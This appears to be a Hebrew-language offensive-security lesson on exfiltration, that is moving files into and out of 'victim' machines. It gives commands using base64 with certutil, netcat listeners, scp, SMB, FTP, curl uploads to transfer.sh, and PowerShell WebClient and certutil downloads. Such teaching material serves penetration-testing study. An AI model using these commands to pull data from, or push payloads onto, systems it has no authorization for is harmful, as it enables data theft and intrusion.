
## הקדמה
הסתננות או באנגלית Exfiltration הן טכניקות שבהן אנחנו מקבלים או שולחים מהמחשבים והרשתות שאותם אנחנו תוקפים מידע- לדוגמה, הסתננות יכולה להיות להביא קובץ מהמחשבים, או לשלוח קובץ.
נלמד בהרצאה הבאה כמה טכניקות קלות להעברה וקבלה של קבצים.
- קודם אנחנו צריכים להבין איזה יכולות טכנולוגיות אנחנו יכולים לעשות מעל המחשבים הקורבנות, כלומר- האם יש כלי סייבר שהתקנו על המחשב שמאפשר העלה והורדה של קבצים? (למשל וובשל כזה או אחר), מה אנחנו כן יכולים להעביר?


## קבצים קטנים
**לינוקס:**
למשל, אם אנחנו יכולים לקבל shell על מחשב מסויים, והקובץ שאנחנו רוצים להעביר קטן- אפשר לעשות לו base64 encode ואז לגרום למחשב היעד להריץ 
```
echo <our base64 encoded text> | base54 -d > ./file
```
כאשר נוכל לחשב את הטקסט המקודד באמצעות הפקודה במחשב שלנו
```
base64 -w0 ./file
```

**ווינדוס:**
ובדיוק באותה הדרך, גם בווינדוס נוכל לבצע זאת.
נריץ את הפקודה הבאה כדי לקבל את הbase64 של הקובץ- 
```
certutil -encode .\file payload.b64 
type payload.b64
```
ונריץ במחשב הקורבן כדי להעביר את הקובץ.
```
echo <our base64 encoded text> > payload.b64
certutil -decode payload.b64 payload.dll
```

## קבצים גדולים

אבל מה אם מדובר בקבצים גדולים? שלא נוכל פשוט לכתוב פקודה עם הודעה base64 ארוכה?  
נוכל להשתמש ב-HTTP, SSH, SMB, FTP וכל פרוטוקול שמאפשר העלה והורדה של קבצים.  
אפילו נוכל להשתמש ב-nc!

- כמובן ששימו לב שבכל הפקודות בגלל השימוש בשירותים נאלץ לפתוח פורט איפשהו, אז שימו לב שאת הפורט אנחנו נפתח בצד שיכול להאזין ושהשני יכול להתחבר אילו. כלומר אם מדובר במחשב ברשת פנימית, כנראה שלא נוכל להגיע אליו אם נפתח פורט מאזין, אז נגרום לו להתחבר לשירות אינטרנטי כלשהו (אנחנו, אם יש לנו אייפי פומבי, או שירות אינטרנטי צד שלישי).
#### שימוש ב-nc

**לינוקס:**  
לשלוח קובץ:

```bash
cat file.txt | nc -l -p 1234
```

לקבל קובץ:

```bash
nc <ip> 1234 > received_file.txt
```

**ווינדוס:**  
לשלוח קובץ:

```bash
type file.txt | nc -l -p 1234
```

לקבל קובץ:

```bash
nc <ip> 1234 > received_file.txt
```

כמובן, שפה המחשב ששולח הוא האחד שמאזין, אף כמובן שלא חייב ואפשר להחליף את התפקידים. (אם אנחנו לא יכולים להאזין אבל הקורבן יכול)

#### פרוטוקול SSH

**לינוקס:**  
לשלוח קובץ:

```bash
scp file.txt user@remote_host:/path/to/destination
```

לקבל קובץ:

```bash
scp user@remote_host:/path/to/file.txt /local/destination
```

**ווינדוס:**  
לשלוח קובץ:

```bash
pscp file.txt user@remote_host:/path/to/destination
```

לקבל קובץ:

```bash
pscp user@remote_host:/path/to/file.txt C:\local\destination
```

בפקודות למעלה, הן נכונות בהנחה שיש שרת SSH בצד השני של הנשלח, כמובן שתוכלו להתקין גם dropbear על הקורבן כדי להרים שרת ssh שתוכלו להעביר ממנו קבצים.
#### פרוטוקול SMB

**לינוקס:**  
לשלוח קובץ:

```bash
smbclient //remote_host/share -U user -c "put file.txt"
```

לקבל קובץ:

```bash
smbclient //remote_host/share -U user -c "get file.txt"
```

**ווינדוס:**  
לשלוח קובץ:

```bash
net use \\remote_host\share /user:user password
copy file.txt \\remote_host\share
```

לקבל קובץ:

```bash
net use \\remote_host\share /user:user password
copy \\remote_host\share\file.txt C:\local\destination
```

#### פרוטוקול FTP

**לינוקס:**  
לשלוח קובץ:

```bash
ftp remote_host
> put file.txt
```

לקבל קובץ:

```bash
ftp remote_host
> get file.txt
```

**ווינדוס:**  
לשלוח קובץ:

```bash
ftp remote_host
> put file.txt
```

לקבל קובץ:

```bash
ftp remote_host
> get file.txt
```

#### פרוטוקול HTTP

**לינוקס:**  
לשלוח קובץ (באמצעות `curl`):

```bash
curl -X POST -F "file=@file.txt" http://remote_host/upload
```

לקבל קובץ (באמצעות `curl`):

```bash
curl -O http://remote_host/file.txt
```

**ווינדוס:**  
לשלוח קובץ (באמצעות `curl`):

```bash
curl -X POST -F "file=@file.txt" http://remote_host/upload
```

לקבל קובץ (באמצעות `curl`):

```bash
curl -O http://remote_host/file.txt
```

השרת יכול להיות שרת http שאתם מרימים או בצד הקורבן או בצד שלכם באמצעות אפילו python.
```
sudo python3 -m http.server 80
```
וכמובן שהשרת יכול להיות צד שלישי. 
כמו שירותי transfer.sh או file.io- אתרים שמאפשרים לנו להעלות ולהוריד קבצים בקלות דרך הטרמינל.

העלת קובץ:
```
curl --upload-file ./file.txt https://transfer.sh/file.txt
```

הורדת קובץ:
```
`curl -O https://transfer.sh/<file-id>`
```

ולגבי http, שימו לב שבווינדוס, יש שני סוגי פקודות curl, 
תוכנת curl.exe ופקודת `Invoke-WebRequest` והסינטקס שלהם שונה!
ולפעמים שהפקודות לא זמינות, ניתן להשתמש באובייקט "Net.WebClient" של .net בפאוורשל!
```
(New-Object Net.WebClient).DownloadFile("https://transfer.sh/<file-id>","C:\Windows\Temp\output")
```
וגם ניתן להשתמש בcertutil.exe כדי להוריד קובץ,
```
certutil -urlcache -split -f http://transfer.sh/<file-id> .\file
```
